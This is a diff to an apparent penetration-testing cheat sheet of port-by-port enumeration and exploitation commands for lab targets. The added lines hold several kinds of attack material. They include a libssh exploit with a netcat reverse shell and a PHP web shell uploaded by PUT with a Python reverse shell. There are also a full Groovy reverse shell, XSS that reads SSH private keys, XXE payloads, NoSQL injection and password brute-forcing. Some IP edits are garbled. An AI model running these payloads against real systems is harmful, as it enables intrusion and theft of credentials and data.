@@ -35,6 +35,7 @@ Table of Contents
       * [RDP - 3389](#rdp---3389)
       * [WinRM - 5985](#winrm---5985)
       * [VNC - 5900](#vnc---5900)
+      * [Redis - 6379](#redis---6379)
       * [MsDeploy - 8172](#msdeploy---8172)
       * [Webdav](#webdav)
       * [Unknown ports](#unknown-ports)
@@ -207,6 +208,9 @@ wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
 chmod +x stegsolve.jar
 java -jar stegsolve.jar
 
+# Stegpy
+stegpy -p file.png
+
 # Check png corrupted
 pngcheck -v image.jpeg
 
@@ -239,14 +243,16 @@ nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-ba
 - Vulnerable Versions: 7.2p1
 
 ```
+Vulnerable Versions: 7.2p1
 nc 10.11.1.111 22
+
 User can ask to execute a command right after authentication before it’s default command or shell is executed
 
-$ ssh -v noraj@192.168.1.94 id
+$ ssh -v user@10.10.1.111 id
 ...
 Password:
 debug1: Authentication succeeded (keyboard-interactive).
-Authenticated to 192.168.1.94 ([192.168.1.94]:22).
+Authenticated to 10.10.1.111 ([10.10.1.1114]:22).
 debug1: channel 0: new [client-session]
 debug1: Requesting no-more-sessions@openssh.com
 debug1: Entering interactive session.
@@ -255,7 +261,7 @@ debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
 debug1: Sending command: id
 debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
 debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
-uid=1000(noraj) gid=100(users) groups=100(users)
+uid=1000(user) gid=100(users) groups=100(users)
 debug1: channel 0: free: client-session, nchannels 1
 Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
 Bytes per second: sent 43133.4, received 44349.5
@@ -263,38 +269,40 @@ debug1: Exit status 0
 
 Check Auth Methods:
 
-$ ssh -v 192.168.1.94
+$ ssh -v 10.10.1.111
 OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
 ...
 debug1: Authentications that can continue: publickey,password,keyboard-interactive
 
 Force Auth Method:
 
-$ ssh -v 192.168.1.94 -o PreferredAuthentications=password
+$ ssh -v 10.10.1.111 -o PreferredAuthentications=password
 ...
 debug1: Next authentication method: password
 
 BruteForce:
 
-hydra -l noraj -P /usr/share/wordlists/password/rockyou.txt -e s ssh://192.168.1.94
-medusa -h 192.168.1.94 -u noraj -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
-ncrack --user noraj -P /usr/share/wordlists/password/rockyou.txt ssh://192.168.1.94
+patator ssh_login host=10.11.1.111 port=22 user=root 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt password=FILE0 -x ignore:mesg='Authentication failed.'
+hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
+medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
+ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111
 
 LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access 
 Id
-python /usr/share/exploitdb/exploits/linux/remote/46307.py 192.168.1.94 22 id
+python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 id
 Reverse
-python /usr/share/exploitdb/exploits/linux/remote/46307.py 192.168.1.94 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 80 >/tmp/f"
+python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.111 80 >/tmp/f"
 
 SSH FUZZ
 https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt
 
 cpan Net::SSH2
-./sshfuzz.pl -H 192.168.1.94 -P 22 -u noraj -p noraj
+./sshfuzz.pl -H 10.10.1.111 -P 22 -u user -p user
 
 use auxiliary/fuzzers/ssh/ssh_version_2
 
-ssh_audit
+SSH-AUDIT
+https://github.com/arthepsy/ssh-audit
 
 • https://www.exploit-db.com/exploits/18557 ~ Sysax 5.53 – SSH ‘Username’ Remote Buffer Overflow
 • https://www.exploit-db.com/exploits/45001 ~ OpenSSH < 6.6 SFTP – Command Execution                             
@@ -303,10 +311,15 @@ ssh_audit
 
 http://www.vegardno.net/2017/03/fuzzing-openssh-daemon-using-afl.html
 
+
+SSH Enum users < 7.7:
+https://github.com/six2dez/ssh_enum_script
+https://www.exploit-db.com/exploits/45233
+python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/dev/null | grep "is a"
+
 ```
 
 ## Port 25 - Telnet
-
 
 ```
 nc -nvv 10.11.1.111 25
@@ -317,6 +330,18 @@ VRFY root
 
 nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111
 smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111
+
+Send email unauth:
+
+MAIL FROM:admin@admin.com
+RCPT TO:DestinationEmail@DestinationDomain.com
+DATA
+test
+
+.
+
+Receive:
+250 OK
 ```
 
 ## Port 69 - UDP - TFTP
@@ -417,11 +442,15 @@ winexe -U username //10.11.1.111 "cmd.exe" --system
 
 smbtree 10.11.1.111
 
-nmblookup -A target
+nmblookup -A 10.11.1.111
 
 smbmap -u victim -p s3cr3t -H 10.11.1.111
 
-dentro de \Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml está el usuario y la contraseña que se puede desencriptar con "gpp-decrypt "
+Inside \Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml can found user and passwrod, decrypt with "gpp-decrypt "
+
+Mount SMB in Linux:
+
+mount -t cifs -o username=user,password=password //10.11.1.111/share /mnt/share
 ```
 
 
@@ -437,6 +466,9 @@ snmp-check 10.11.1.111 -c public|private|community
 
 ```
 ldapsearch -h 10.11.1.111 -p 389 -x -b "dc=mywebsite,dc=com"
+ldapsearch -x -h 10.11.1.111 -D 'DOMAIN\user' -w 'hash-password'
+ldapdomaindump 10.11.1.111 -u 'DOMAIN\user' -p 'hash-password'
+patator ldap_login host=10.10.1.111 1=/root/Downloads/passwords_ssh.txt user=hsmith password=FILE1 -x ignore:mesg='Authentication failed.'
 ```
 
 ## HTTPS - 443
@@ -450,7 +482,7 @@ Read the actual SSL CERT to:
 ```
 sslscan 10.11.1.111:443
 ./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST > OUTPUT-FILE.html
-nmap -sV --script=ssl-heartbleed 192.168.101.8
+nmap -sV --script=ssl-heartbleed 10.1.10.111
 mod_ssl,OpenSSL version Openfuck
 ```
 
@@ -566,17 +598,26 @@ rdesktop -u guest -p guest 10.11.1.111 -g 94%
 ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
 ```
 
-## WinRM - 5985
-
-```
-https://github.com/Hackplayers/evil-winrm
-./evil-winrm.rb -i 10.11.1.111 -u Administrator -p 'password1'
-```
-
 ## VNC - 5900
 
 ```
 nmap --script=vnc-info,vnc-brute,vnc-title -p 5900 10.11.1.111
+```
+
+## WinRM - 5985
+
+```
+https://github.com/Hackplayers/evil-winrm
+gem install evil-winrm
+evil-winrm -i 10.11.1.111 -u Administrator -p 'password1'
+evil-winrm -i 10.11.1.111 -u Administrator -H 'hash-pass' -s /scripts/folder
+```
+
+## Redis - 6379
+
+```
+https://github.com/Avinash-acid/Redis-Server-Exploit
+python redis.py 10.10.10.160 redis
 ```
 
 ## MsDeploy - 8172
@@ -624,6 +665,33 @@ wpscan --url http://10.11.1.111
 wpscan --url http://10.11.1.111 --enumerate vp
 wpscan --url http://10.11.1.111 --enumerate vt
 wpscan --url http://10.11.1.111 --enumerate u
+wpscan -e --url https://url.com
+
+
+Check IP behing WAF:
+https://IP.com/2020/01/22/discover-cloudflare-wordpress-ip/
+pingback.xml:
+<?xml version="1.0" encoding="iso-8859-1"?>
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+ <param>
+  <value>
+   <string>http://10.0.0.1/hello/world</string>
+  </value>
+ </param>
+ <param>
+  <value>
+   <string>https://IP.com/2020/01/22/hello-world/</string>
+  </value>
+ </param>
+</params>
+</methodCall>
+
+curl -X POST -d @pingback.xml https://ip.com/xmlrpc.php
+
+Enum User:
+for i in {1..50}; do curl -s -L -i https://ip.com/wordpress\?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'; done
 
 # Joomscan
 joomscan -u  http://10.11.1.111 
@@ -637,10 +705,10 @@ curl -i -X OPTIONS 10.11.1.111
 
 	# With PUT option enabled:
 	
-	nmap -p 80 192.168.1.124 --script http-put --script-args http-put.url='/test/rootme.php',http-put.file='/root/php-reverse-shell.php'
+	nmap -p 80 10.1.10.111 --script http-put --script-args http-put.url='/test/rootme.php',http-put.file='/root/php-reverse-shell.php'
 
-	curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.1.124/test/cmd.php
-	&& http://192.168.1.124/test/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.1.110%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+	curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://10.1.10.111/test/cmd.php
+	&& http://10.1.10.111/test/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%210.1.10.111%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
 
 # Get everything
 curl -i -L 10.11.1.111
@@ -660,6 +728,13 @@ curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://10.11.1.111/test/shell
 curl -X POST http://10.11.1.11/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'
 
 dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix
+
+site:domain.com intext:user
+
+
+# Firebase
+https://github.com/Turr0n/firebase
+python3 firebase.py -p 4 --dnsdumpster -l file
 
 ```
 
@@ -686,6 +761,55 @@ dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix
 ./dirsearch.py -u 10.10.10.157 -e php
 
 medusa -h 10.11.1.111 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
+
+Crawl:
+
+dirhunt https://url.com/
+hakrwaler https://url.com/
+
+Fuzzer:
+
+ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://url.com/FUZZ
+
+dirsearch -r -f -u https://crm.comprarcasa.pt --extensions=htm,html,asp,aspx,txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --request-by-hostname -t 40
+
+#IIS
+#ViewState:
+https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC
+
+#WebResource.axd:
+https://github.com/inquisb/miscellaneous/blob/master/ms10-070_check.py
+
+#ShortNames
+https://github.com/irsdl/IIS-ShortName-Scanner
+java -jar iis_shortname_scanner.jar 2 20 http://domain.es
+
+#Jenkins
+JENKINSIP/PROJECT//securityRealm/user/admin
+JENKINSIP/jenkins/script
+
+#Groovy RCE
+def process = "cmd /c whoami".execute();println "${process.text}";
+#Groovy RevShell
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+# Joomscan
+joomscan -u  http://10.11.1.111 
+joomscan -u  http://10.11.1.111 --enumerate-components
+
+# PHP bypass disable_functions and open_basedir
+# Chankro
+https://github.com/TarlogicSecurity/Chankro
+python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
+
+# Cookies error padding:
+# Get cookie structure
+padbuster http://10.10.1.111/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "user=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding"
+# Get cookie for other user (impersonation)
+padbuster http://10.10.1.111/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "user=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding" -plaintext 'user=administratorme'
 ```
 
 
@@ -759,8 +883,6 @@ cat php_cmd.php
 
 ```
 
-
-
 ### SQL-Injection
 
 ```
@@ -785,10 +907,64 @@ sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --le
 sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dump -T users -D admin
 
 sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords
+
+# NoSQL
+' || 'a'=='a
+mongodbserver:port/status?text=1
+
+#in URL
+username[$ne]=toto&password[$ne]=toto
+
+#in JSON
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt":""}, "password": {"$gt":""}}
+
+## SSRF
+
+web that send request to external IP's, we call 127.0.0.1:8080 / 10.1.10.111 to enum internal network
+
+chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:3000
+GET /ssrf?user=&comment=&link=http://127.0.0.1:3000 HTTP/1.1
+
+Also we can enum ports
 ```
+
 ### XSS
+
 ```
 <script>alert("XSS")</script>
+<script>alert(1)</script>
+
+https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?m=1
+
+" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); </script>
+
+" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>
+
+# XXE
+
+XML entry that reads server, Doctype, change to entity "System "file:///etc/passwd""
+
+Instead POST:
+
+<?xml version="1.0" ?>
+    <!DOCTYPE thp [
+        <!ELEMENT thp ANY>
+        <!ENTITY book "Universe">
+    ]>
+    <thp>Hack The &book;</thp>
+    
+Malicious XML:
+
+<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY>
+<!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack The
+%26book%3B</thp>
+
+XXE OOB
+
+<?xml version="1.0"?><!DOCTYPE thp [<!ELEMENT thp ANY >
+<!ENTITY % dtd SYSTEM "http://[YOUR_IP]/payload.dtd"> %dtd;]>
+<thp><error>%26send%3B</error></thp>
 ```
 
 ### Sql-login-bypass
@@ -840,7 +1016,10 @@ hydra -l root@localhost -P cewl 10.11.1.111 http-post-form "/otrs/index.pl:Actio
 # API REST LOGIN POST
 hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.11.1.111 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -t 64
 
-
+# Dictionary creation
+https://github.com/LandGrey/pydictor
+https://github.com/Mebus/cupp
+git clone https://github.com/sc0tfree/mentalist.git
 ```
 
 Online crackers
@@ -890,7 +1069,6 @@ msfvenom -p windows/shell_reverse_tcp lhost=10.11.1.111 lport=443 EXITFUNC=threa
 
 8. Final buffer like:
 buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
-
 
 ```
 
@@ -993,10 +1171,18 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 
 ## Common
 
+```
+# Docker
+https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/
+
+```
+
 ### Set up Webserver
 
 ```
 python -m SimpleHTTPServer 8080
+https://github.com/sc0tfree/updog
+updog
 ```
 
 ### Set up FTP Server
